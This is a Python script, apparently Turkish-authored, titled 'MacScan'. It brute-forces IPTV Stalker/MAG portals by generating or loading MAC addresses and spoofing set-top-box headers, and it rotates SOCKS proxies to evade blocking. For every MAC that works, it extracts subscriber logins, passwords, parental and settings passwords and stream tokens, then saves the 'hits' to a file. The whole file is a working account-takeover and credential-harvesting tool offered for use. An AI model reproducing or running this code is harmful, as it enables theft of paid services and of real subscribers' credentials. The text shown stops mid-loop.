import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re
nickn=""
nickn="•❖•MacScan•❖•"
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
import subprocess
import pathlib
subprocess.run(["clear", ""])
try:
	import requests
except:
	print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("sock modulu yüklü değil \n sock modulü yükleniyor \n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock

subprocess.run(["clear", ""])

oto=0
tur=0
Seri=""
csay=0

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:ECDH+AESGCM:ECDH+CHACHA20:DH+AESGCM:DH+CHACHA20:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:RSA+AESGCM:RSA+AES:RSA+HIGH:!aNULL:!eNULL:!MD5:!3DES"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
ses= requests.Session()
logging.captureWarnings(True)

say=0
yanpanel="hata" 
imzayan="" 
bul=0
hit=0
prox=0
cpm=1


macSayisi=999999999999991# 1#deneme sayisı
feyzo=("""
\33[0m▰▰▰▰ᴘʏᴛʜᴏɴ  \33[0m\33[1;100m Mac\33[1;30;107m Scan\33[0m\33[1;41m ★★   \33[0m ᴄᴏɴғɪɢ▰▰▰▰       \33[33m                 
╔══════════════════════════════════        
║████  ████ ██ ░░ ██ ██████ ░ ████ ░░░         
║██ ░░ ██ ░░ ██  ██ ░░░░ ██ ░██ ░██ ░░        
║████  ████ ░ ████ ░░░ ██ ░ ██ ░░░██ ░     
║██ ░░ ██ ░░░░ ██ ░░ ██ ░░░░ ██ ░██ ░░      
║██ ░░ ████ ░░ ██ ░░ ██████ ░ ████ ░░░        
╚══════════════════════════════════                   
\33[0m▰▰▰▰   \33[0m\33[1;100m Mac\33[1;30;107m Scan\33[0m\33[1;41m ★★   \33[0m ᴄᴏɴғɪɢ ▰▰▰▰          
   \33[0;1m""")
print(feyzo) 
kisacikti=""
pattern= "(00:\w{2}:79:\w{2}:\w{2}:\w{2})"
ozelmac=""
#################
nick='•❖•MacScan•❖•'
bekleme=20
subprocess.run(["clear", ""])
print(feyzo) 
panel = input("""
	\33[1;41m
	 🌎 ★彡[ᴡᴇʟᴄᴏᴍᴇ ᴡᴏʀʟᴅ]彡★ 🌎  \n   🌟 ᴹᵒᵈ ⱽᵉʳˢᶦᵒⁿ ᵇʸ ᶦˢʳᵃᵉˡˡᵖᶻ¹ 🌟
\33[1;44m
Example PanelName:Port = hdhd.tk:80\n
	\33[1mPlease write panel name!!!
	
	\33[1;40m
Panel:Port=\33[0m\33[31m\33[1;37;41m""")
print('\33[0m')
uzmanm="server/load.php"
if len(panel)==1:# panel=="1":
    


    uzmanm=panel
    print(uzmanm)
    if uzmanm=="8":
    	uzmanm=input("reply=")
    if  uzmanm=="1":
    	uzmanm="portal.php"
    if uzmanm=="" or uzmanm=="2":
    	uzmanm="server/load.php"
    if uzmanm=="3":
    	uzmanm="stalker_portal/server/load.php"
    if uzmanm=="4":
    	uzmanm="c/server/load.php"
    if uzmanm=="5":
    	uzmanm="bs.mag.portal.php"
    if uzmanm=="6":
    	uzmanm="portalcc.php"
    if uzmanm=="7":
    	uzmanm="magLoad.php"    	
    if uzmanm=="x":
    	bekleme=input(int("Bekleme Süresini Saniye bazında yazın.\n Saniye="))
    	uzmanm="server/load.php"
    if uzmanm=="z":
    		kisacikti="1"
    		uzmanm="server/load.php"   
    				
    subprocess.run(["clear", ""])
    print(feyzo) 
    panel = input("""
Example PanelName:Port = hdhd.tk:80\n
	\33[1mPlease write panel name!!! \n\n
Panel:Port=\33[0m\33[31m\33[1m""")
#print(panel.split('/')[3])

if bekleme=="":
	bekleme=20
else:
	bekleme=int(bekleme)
try:
	if panel.split('/')[3] =='stalker_portal':
		uzmanm="stalker_portal/server/load.php"
		panel=panel.replace('/stalker_portal','')
except:pass
print(panel)
#	print(panel)#http://z.zcatt.cc/stalker_portal/c/
subprocess.run(["clear", ""])
print("\33[1;40m"+feyzo) 
kanalkata="0"
kanalkata=input("""\33[1;40m
Include Channel Categories in signature?

	0=🌐 No Category
	1=🌐 Country Channel Category
	2=🌐 Add all (Live-VOD SERIES)

\33[1mEnter Answer=""")



subprocess.run(["clear", ""])
print(feyzo) 

combo=input("""
	Select the scan type..!
1=🌐 Custom Combo
2=🌐 Automatic Combo

 reply=""" )
subprocess.run(["clear", ""])
print(feyzo) 
totLen="000000"
if combo=="1":
 	say=0
 	dsy=""
 	dir='./combo/'
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+"=⫸ "+files+'\n'
 	print ("""Choose your combo from the list below!!!
"""+dsy+"""
\33[33mIn your combo folder """ +str(say)+""" file found !
	""")
 	dsyno=str(input(" \33[31mCombo No =\33[0m"))
 	say=0
 	for files in os.listdir (dir):
 			say=say+1
 			if dsyno==str(say):
 				dosyaa=(dir+files)
 	say=0
 	print(dosyaa) 
 	c=open(dosyaa, 'r')
 	
 	totLen=c.readlines()
 	subprocess.run(["clear", ""])
 	print(feyzo) 
 	baslama=""
 	baslama=input("""
The file in the selected combo \33[1;31;43m"""+str(len(totLen))+"""\33[0;40m pcs Mac is foreseen.
 
Do you want to change the combo initial scan order?

Yes =🌐 Order(line) write your number.
No =🌐 Just press OK Enter.

		reply=""")
 	if not baslama =="":
 		baslama=int(baslama)
 		csay=baslama
 		
 		
subprocess.run(["clear", ""])
print(feyzo)  	
if combo=="1":
	print("\n\nSo that it can continue scanning when the Mac in your combo is running low.")
	
macyazi=("""
\33[1mChoose Mac combination type...?\33[0m
\33[33mFor Custom Mac =🌐 \33[31m1
\33[33mFor Random Mac =🌐 \33[31m2

\33[0m\33[1mMac combination type=\33[31m""")
macturu=input(macyazi)
if macturu=="":
	macturu="2"
#################
#print("\nTo be scanned Panel:Port=\33[1m\33[31m" + panel +"\33[0m\n") 
#D4:CF:F9
#MacCombo="33:44:CF:4"
MacCombo="00:1A:79:"
#MacCombo="10:27:be:"

Macs = input("""\33[0m
Type 5 for running Mac test...
Type 0 to change Mac type...

\33[33mUse Serial Mac?
\33[1m\33[34mYes (1) \33[0m or \33[1m\33[32mNo (2) \33[0m Write!! 

reply=""") 
if Macs=="5":
	macSayisi=1#int(input("Number of macs to try =")) 
	ozelmac=input("Custom running Mac =")
dmac=""
if  Macs=="0":
	dmac=input("""
Default Mac Type
	1= 00:1A:79:
	2= 10:27:BE:
	3= 33:44:CF
	4= I will determine myself...
	""")
	if dmac=="1":
		MacCombo="00:1A:79:"
		Macs = input("\33[0m\nUse Serial Mac? \nreply \33[1m\33[34mYes (1) \33[0m or \33[1m\33[32mNo (2) \33[0m write!! =") 

	if dmac=="2":
		MacCombo="10:27:BE:"
		Macs = input("\33[0m\nUse Serial Mac? \nreply \33[1m\33[34mYes (1) \33[0m or \33[1m\33[32mNo (2) \33[0m write!! =") 

	if dmac=="3":
		MacCombo="33:44:CF:"
		Macs = input("\33[0m\nUse Serial Mac? \nreply \33[1m\33[34mYes (1) \33[0m or \33[1m\33[32mNo (2) \33[0m write!! =") 

	if dmac=="4":
		MacCombo=input("Write the first three match types...")
		Macs = input("\33[0m\nUse Serial Mac? \nreply \33[1m\33[34mYes (1) \33[0m or \33[1m\33[32mNo (2) \33[0m write!! =") 


if Macs[:1]=="e" or Macs[:1]=="E"  or Macs=="1":
    Seri=input("Sample="+MacCombo+"\33[31m5\33[0m\nSample="+MacCombo+"\33[31mFa\33[32m\nWrite one or two values!!!\33[0m\n\33[1m"+MacCombo+"\33[31m")
   # Seri=Seri[:2]
    #MacCombo=MacCombo+Seri[:2]
#################
#MacCombo=MacCombo
subprocess.run(["clear", ""])
print(feyzo) 
#print(len(feyzo)) 
mm=MacCombo.replace(':',"")
#panel="titan.panel.tm"


if panel=="" :
    exit() 
#if len(mm)==6:
#	turet=6
#	MacCombo=MacCombo+":"
#if len(mm)==7:
#	turet=5
#if len(mm)==8:
#	turet=4
#	MacCombo=MacCombo+":"
Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
panel=panel.replace('stalker_portal','/stalker_portal')
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
       
subprocess.run(["clear", ""])
print(feyzo) 
acount_id=""
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
sdd=0
bad=0
proxies=""
proxi=input("""
	Do you want to use Proxies?
1 -🌐 Yes
2 -🌐 No

1 or 2 write =""")
subprocess.run(["clear", ""])
print(feyzo) 
if proxi =="1":
	say=0
	dsy=""
	dir='./proxy/'
	for files in os.listdir (dir):
		if files.endswith(".txt"):
			say=say+1
			dsy=dsy+"	"+str(say)+"-) "+files+'\n'
	print ("""
	Choose your combo from the list below!!!
"""+dsy+"""
\33[33mIn your combo folder """ +str(say)+""" file found !
Please select your Proxy Socks5 file...!
	""")
	dsyno=str(input(" \33[31mCombo No =\33[0m"))
	say=0
	for files in os.listdir (dir):
		if files.endswith(".txt"):
			say=say+1
			if dsyno==str(say):
				dosyaa=(dir+files)
	say=0
	proxies=""
	print(dosyaa) 
	Proxy=dosyaa
	c=open(Proxy,'r')
	sock=c.readlines()
	prox=0
	Proxy=dosyaa
	subprocess.run(["clear", ""])
	print(feyzo) 
	pro=input("""
What is the proxy type in the file you selected?
	1 -🌐 ipVanish Socks5
	2 -🌐 free Socks4 
	3 -🌐 free Socks5
		Proxy type=""")
subprocess.run(["clear", ""])
print(feyzo)
DosyaA="./hits/" + panel.replace(":","_").replace('/','') +"@•❖•myhits•❖•.txt"
def yaz(hits):
    dosya=open(DosyaA,'a+') 
    dosya.write(hits)
    dosya.close()
subprocess.run(["clear", ""])  
print(feyzo) 
macaddres=MacCombo
	
for mag in range(16**6):
	oto=""
	macr=""
	tur=0
	hex_num = hex(mag)[2:].zfill(6)
	genmac = MacCombo+"%02x:%02x:%02x"% (random.randint(0, 256),random.randint(0, 256),random.randint(0, 256))
	genmac=genmac.replace(':100',':10')
#	print(Seri)
	if len(Seri) ==1:
	   genmac=str(genmac).replace(str(genmac[:10]),macaddres+Seri)
	if len(Seri)==2:
	   genmac=str(genmac).replace(str(genmac[:11]),macaddres+Seri)
	macr=(genmac)
	s=s+1
	if s ==16:
		ss=ss+1
		s=0
	if ss ==16:
		sss=sss+1
		ss=0
		s=0
	if sss==16:
		ssss=ssss+1
		sss=0
		ss=0
		s=0
	if ssss==16:
		sd=sd+1
		ssss=0
		sss=0
		ss=0
		s=0		
	if sd==16:
		sdd=sdd+1
		sd=0
		sss=0
		ss=0
		s=0

	if sdd==16:
		sdd=0
		sd=0
		sss=0
		ss=0
		s=0
	
	seri1=a[sdd]
	seri2=a[sd]
	#print(Seri)
	if not Seri=="":
		if len(Seri)==1:
			seri1=Seri[0]
			
		if len(Seri)==2:
			seri1=Seri[0]
			seri2=Seri[1]
	maca=(seri1+seri2+":"+a[ssss]+a[sss]+":"+a[ss]+a[s])
	#print(maca)
	if macturu =="1":
		mac=mac=MacCombo+maca
	else:
		mac=macr
	
		
		
	
	
	
	#macs=mac.replace(':','%3A')
	#mac=mac.upper()
	combo=combo
	if combo=="1":
		#print(combo)
		if len(totLen)-2 > csay:
			#print(combo)
			while True:
			    # print(csay)
			     csay=csay+1
			     if csay > len(totLen)-1 :
			     	#print("######")
			     	break
			     macv =re.search(pattern,totLen[csay],re.IGNORECASE)
			     if macv:
			     	mac=macv.group()
			     	if not dmac=="":
			     		mac=mac.upper() 
			     		mac=mac.replace('00:1A:79',MacCombo)
			     	break
	
	
	if not ozelmac=="":
		mac=ozelmac
	#mac="00:1a:79:67:e9:19"
	mac=mac.replace("::",":")
	mac=mac.replace(" ","")
	mac=mac.replace("::",":")
	mac=mac.replace(" ","")
	
	macs=mac.replace(':','%3A')	     

		
	HEADERA={
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FIstanbul;",
"Referer": "http://"+panel+"/c/",
"X-User-Agent":"Model: MAG322; Link: Ethernet",
"Accept": "*/*",
"Connection": "Keep-Alive",
"Host": panel.replace('/stalker_portal',''),
"Accept-Encoding": "gzip",
"User-Agent": "okhttp/4.7.1",
	}	
	#print(HEADERA)
	url1="http://"+panel+"/"+uzmanm+"?action=handshake&type=stb"
	#print(url1)
	#print(panel)
	token=""
	veri=""
	#print(url1)
	
	
	if proxi =="1":
			if prox==len(sock)-2:
				prox=0
			#print("evet")
			if pro=="1":
					#print("1")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							#print(prox)
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							pip=pveri.split(':')[0]
							pport=pveri.split(':')[1]
							pname=pveri.split(':')[2]
							ppass=pveri.split(':')[3]
							proxies={'http':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport,
							'https':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport}
							print('\33[33mSocks5 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad)+"\33[0m" )
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(req.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
			if pro=="2":
					#print("2")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							#print(pveri)
							pip=pveri.split(':')[0]#""
							pport=pveri.split(':')[1]#""
							proxies={'http':'socks4://'+pip+':'+pport,
						'https':'socks4://'+pip+':'+pport}
							print('Socks4 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad))
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(re.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
	
			if pro=="3":
					#print("2")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							#print(pveri)
							pip=pveri.split(':')[0]#""
							pport=pveri.split(':')[1]#""
							proxies={'http':'socks5://'+pip+':'+pport,
						'https':'socks5://'+pip+':'+pport}
							print('Socks5 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad))
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(re.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
		
	
	

	
#	try:
	else:
		bag1=0
		while True:
			try:
				res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag1=bag1+1
				time.sleep(bekleme)
				if bag1==4:
					quit()
		bag1=0
					
		veri=str(res.text)
		
	if 1==1:
            renk="\33[0m"
            if 'token' in veri:
            	token=veri.replace('{"js":{"token":"',"")
            	token=token.split('"')[0]
            	#token=token.replace('"}}',"")
            	#print(token)
            	renk="\33[0m"
            else:
            	renk="\33[41m"
            
            say=say+1
            #print(token)➤ x=➤ 
            total=str(say) 
            cpm=(time.time()-cpm)
            cpm=(round(60/cpm))
            print ("\33[0m\33[1;100m Mac\33[1;30;107m Scan\33[0m\33[1;41m ️⚡️️⚡ \33[0m\33[1;36mTotal ➤"+total+" \33[33m Hit ➤" + str(hit)+ " \33[1;31;40m Cpm ➤" +str(cpm)+"      \n " +renk+mac+" \33[1;32;40m" +panel)
            
            cpm=time.time()
            
            
            HEADERd={
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FIstanbul;",
"Referer": "http://"+panel+"/c/",
"X-User-Agent":"Model: MAG322; Link: Ethernet",
"Accept": "*/*",
"Connection": "Keep-Alive",
"Authorization": "Bearer "+token,
"Host": panel.replace('/stalker_portal',''),
"Accept-Encoding": "gzip",
"User-Agent": "okhttp/4.7.1",
            }
            
         
            url2="http://"+panel+"/"+uzmanm+"?action=get_profile&type=stb"
          
            while True:
            	try:
            		res = ses.get(url2,proxies =proxies,  headers=HEADERd, timeout=15, verify=False)
            		break
            	except:
            		bag1=bag1+1
            		time.sleep(bekleme)
            		if bag1==4:
            			quit()
            bag1=0
            		
            	
            veri=""
            veri=str(res.text)
            #print(veri)
            #quit()
            ip=""
            fname=""
            stb_id=""
            stb_type=""
            tplan=""
            fname=""
            adult=""
            user=""
            passw=""
            tarrif=""
            if "expire_billing_date" in veri:
            	stb_id=veri.split('id":"')[1]
            	stb_id=stb_id.split('"')[0]
            	
            	stb_type=veri.split('"stb_type":"')[1]
            	stb_type=stb_type.split(',')[0]
            	stb_type=stb_type.replace('"',"")
            	
            	tplan=veri.split('"tariff_plan_id":"')[1]
            	tplan=tplan.split('"')[0]
            	
            	fname=veri.split('"fname":"')[1]
            	fname=fname.split('"')[0]
            	
            	adult=veri.split('parent_password":"')[1]
            	adult=adult.split('"')[0]
            	try:
            		ip=veri.split('ip":"')[1]
            		ip=ip.split('"')[0]
            	except:pass
            	
            	timezon=veri.split('"default_timezone":"')[1]
            	timezon=timezon.split(',')[0]
            	timezon=timezon.replace('"',"")
            	
            	user=veri.split('"login":')[1]
            	user=user.split(',')[0]
            	user=user.replace('"',"")
            	
            	passw=veri.split('","password":')[1]
            	passw=passw.split(',')[0]
            	passw=passw.replace('"',"")
            	passw=passw.replace('"','')
            	
            	sespas=veri.split('"settings_password":"')[1]
            	sespas=sespas.split(',')[0]
            	sespas=sespas.replace('"',"")
            	
            	sbitis=veri.split('expire_billing_date":')[1]
            	sbitis=sbitis.split(',')[0]
            	sbitis=sbitis.replace('"',"")
            	if sbitis=="null":
            		sbitis="Unlimited"
            		
            if 'play_token' in veri:
            	adult=veri.split('parent_password":"')[1]
            	adult=adult.split('"')[0]
            	play_token=veri.split('play_token":"')[1]
            	play_token=play_token.split('"')[0]
            	acount_id=veri.split('name":"')[1]
            	acount_id=acount_id.split('"')[0]
            	stb_id=veri.split('id":"')[1]
            	stb_id=stb_id.split('"')[0]
            	stb_type=veri.split('"stb_type":"')[1]
            	stb_type=stb_type.split('"')[0]
            	sespas=veri.split('"settings_password":"')[1]
            	sespas=sespas.split('"')[0]
            	stb_c=veri.split('"client_type":"')[1]
            	stb_c=stb_c.split('"')[0]
            	timezon=veri.split('"default_timezone":"')[1]
            	timezon=timezon.split('"')[0]
            	tloca=veri.split('"default_locale":"')[1]
            	tloca=tloca.split('"')[0]
            	if 'ip' in veri:
            		try:
            			ip=veri.split('ip":"')[1]
            			ip=ip.split('"')[0]
            		except:pass
            
            bag1=0
            url3="http://"+panel+"/"+uzmanm+"?action=get_main_info&type=account_info"
            while True:
            	try:
            		res = ses.get(url3, proxies =proxies,  headers=HEADERd, timeout=15, verify=False)
            		break
            	except:
            		bag1=bag1+1
            		time.sleep(bekleme)
            		if bag1==4:
            			quit()
            
            bag1=0
            veri=""
            veri=str(res.text)
            
            
            if not veri.count('phone')==0 or not fname=="":
            	hit=hit+1
            	
            	sound="/sound/ching.mp3"
            	file = pathlib.Path(sound)
            	try:
            		if file.exists ():
            			ad.mediaPlay(sound)
            	except:pass
            	#print(veri)
            	if 'tariff_plan' in veri:
            		tarrif=veri.split('tariff_plan":"')[1]
            		tarrif=tarrif.split('"')[0]

            	
            	if 'end_date' in veri:
            		#print(veri)
            		trh=veri.split('end_date":"')[1]
            		trh=trh.split('"')[0]
            	else:
            		trh=veri.split('phone":"')[1]
            		trh=trh.split('"')[0]
            		if not fname=="":
            			if trh=="":
            				trh=sbitis
            	#print(trh)
            	#print(kisacikti)
            	if not kisacikti=="1":
            		#print("boş")
	            	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	            	SNENC=SN.upper()
	            	SNCUT=SNENC[:13]
	            	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	            	DEVENC=DEV.upper()
	            	SG=SNCUT+'+'+(mac)
	            	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	            	SINGENC=SING.upper()
	            	url5="http://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
	            	url5="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
	            	kategori="hata"
	            	if kanalkata=="1" or kanalkata=="2" :
	            		while True:
	            			try:
	            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
	            				break
	            			except:
	            				bag1=bag1+1
	            				time.sleep(bekleme)
	            				if bag1==4:
	            					quit()
	            		bag1=0
	            			
	            		veri=str(res.text)
		            	if veri.count('title":"')>1:
		            		for i in veri.split('title":"'):
		            			kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
		            			kategori=kategori+kanal+" •✬• "
		            			#⚡️✨💫
		            		if '*' in kategori:
		            			kategori=kategori.split("*")[1]
		            		kategori=kategori.replace("\/","/")
		            		kategori=kategori.replace('hata{"js":[{"id":"','')
		            		kategori=kategori.replace('hata{ ','')
	            		
	            	#print(kategori)
	            	url5="http://"+panel+"/"+uzmanm+"?type=vod&action=get_categories&JsHttpRequest=1-xml"
	            	url5="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
	            	kategoriv="hata"
	            	if kanalkata=="2" :
	            		while True:
	            			try:
	            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
	            				break
	            			except:
	            				bag1=bag1+1
	            				time.sleep(bekleme)
	            				if bag1==4:
	            					quit()
	            		bag1=0
	            			
	            		veri=str(res.text)
		            	if veri.count('title":"')>1:
		            		for i in veri.split('title":"'):
		            			kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
		            			kategoriv=kategoriv+kanal+" •◈• "
		            			#⚡️✨💫
		            		if '*' in kategoriv:
		            			kategoriv=kategoriv.split("*")[1]
		            		kategoriv=kategoriv.replace("\/","/")
		            		kategoriv=kategoriv.replace('hata{"js":[{"id":"','')
		            		kategoriv=kategoriv.replace('hata{ ','')
	            	#print(kategori)
	            	url5="http://"+panel+"/"+uzmanm+"?type=series&action=get_categories&JsHttpRequest=1-xml"
	            	url5="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
	            	kategoris="hata"
	            	if kanalkata=="2" :
	            		while True:
	            			try:
	            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
	            				break
	            			except:
	            				bag1=bag1+1
	            				time.sleep(bekleme)
	            				if bag1==4:
	            					quit()
	            		bag1=0
	            			
	            		veri=str(res.text)
		            	if veri.count('title":"')>1:
		            		for i in veri.split('title":"'):
		            			kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
		            			kategoris=kategoris+kanal+" •⛯• ️ "
		            			#⚡️✨💫
		            		if '*' in kategoris:
		            			kategoris=kategoris.split("*")[1]
		            		kategoris=kategoris.replace('\/','')
		            		kategoris=kategoris.replace('hata{"js":[{"id":"','')
		            		kategoris=kategoris.replace('hata{ ','')
		            		
	            		
	            	#print(kategori)            	
	            	#url5="http://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=series&p=1&JsHttpRequest=1-xml&sortby=latest"
	#            	
	#            	while True:
	#            		try:
	#            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
	#            			break
	#            		except:
	#            			bag1=bag1+1
	#            			time.sleep(bekleme)
	#            			if bag1==4:
	#            				break
	#            	bag1=0
	#            	veri=str(res.text)
	#            	print(veri)
	#            	quit()
	            	
	            	
	            	
	            	
	            	url5="http://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=series&p=1&JsHttpRequest=1-xml"
	            	url5="http://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=itv&p=1&JsHttpRequest=1-xml"
	            	token2="play_token" 
	            	while True:
	            		try:
	            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
	            			break
	            		except:
	            			bag1=bag1+1
	            			time.sleep(bekleme)
	            			if bag1==4:
	            				break
	            	bag1=0
	            	veri=str(res.text)
	            	#print(veri)
	            	if 'cmd' in veri:
	            		token2=veri.split('cmd":"')[1]
	            		token2=token2.split('"')[0]
	            	#print(token2)
	            	real=panel
	            	
	            	
	            	
	            	
	            	
	            	
	#            	HEADERd={
	#"Host":panel,            	
	#"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C; Windows NT 10.0; Win64; x64; rv:74.0) AppleWebKit/533.3 Gecko/20100101 Firefox/74.0 MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
	#"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi" ,
	#"Referer": "http://"+panel+"/c/" ,
	#"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
	#"Accept-Language": "en-US,*",
	#"Accept-Charset": "UTF-8,*;q=0.8",
	#"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=b01850af81da130f1f4407a96da5b48c" ,
	#"Accept-Encoding": "gzip, deflate" ,
	#"Connection": "Keep-Alive" ,
	#"Authorization": "Bearer "+token,
	#            }
	            	url5="http://"+real+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/1823_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
	            	url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"
	            	userm=user
	            	pasdm=passw
	            	while True:
	            		try:
	            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
	            			break
	            		except:
	            			bag1=bag1+1
	            			time.sleep(bekleme)
	            			if bag1==4:
	            				break
	            	bag1=0
	            	veri=str(res.text)
	            	#print(veri)
	            	#print(play_token)
	            	#quit()
	            	try:
	            		veri=veri.replace('live\/', '') 
	            		real=veri.split('\/')[2]
	            		userm=veri.split('\/')[3]
	            		pasdm=veri.split(userm+'\/')[1]
	            		pasdm=pasdm.split('\/')[0]
	            	except:pass
	            	#print(userm)
	#            	HEADERd={
	#"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
	#"Referer": "http://"+panel+"/c/" ,
	#"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
	#"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
	#"Accept-Encoding": "gzip, deflate" ,
	#"Connection": "Keep-Alive" ,
	#"X-User-Agent":"Model: MAG254; Link: Ethernet",
	#"Authorization": "Bearer "+token,
	#            }
	            	if userm=="hata":
	            			url5="http://"+real+"/"+uzmanm+"?action=create_link&type=vod&cmd="+token2+"&JsHttpRequest=1-xml"
	            			url5="http://"+real+"/"+uzmanm+"?action=create_link&type=itv&cmd="+token+"&JsHttpRequest=1-xml"
	            			while True:
	            				try:
	            					res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
	            					break
	            				except:
	            					bag1=bag1+1
	            					time.sleep(bekleme)
	            					if bag1==4:
	            						break
	            			bag1=0
	            			try:
	            				real=veri.split('\/')[2]
	            				userm=veri.split('\/')[4]
	            				pasdm=veri.split('\/')[5]
	            			except:pass
	            			
	            	realm=real
	            	
	            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_live_streams"
	            	while True:
	            		try:
	            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
	            			break
	            		except:
	            			bag1=bag1+1
	            			time.sleep(bekleme)
	            			if bag1==4:
	            			 	break
	            	bag1=0
	            	veri=str(res.text)
	            	kanalsayisi=str(veri.count("stream_id"))
	            	#print(kanalsayisi)
	            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_vod_streams"
	            	while True:
	            		try:
	            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
	            			break
	            		except:
	            			bag1=bag1+1
	            			time.sleep(bekleme)
	            			if bag1==4:
	            			 	break
	            	bag1=0
	            	veri=str(res.text)
	            	filmsayisi=str(veri.count("stream_id"))
	            	
	            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_series"
	            	while True:
	            		try:
	            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
	            			break
	            		except:
	            			bag1=bag1+1
	            			time.sleep(bekleme)
	            			if bag1==4:
	            			 	break
	            	bag1=0
	            	veri=str(res.text)
	            	dizisayisi=str(veri.count("series_id"))
	            	if not fname=="":
	            		userm=user
	            		pasdm=passw
	            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm
	            	while True:
	            		try:
	            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
	            			break
	            		except:
	            			bag1=bag1+1
	            			time.sleep(bekleme)
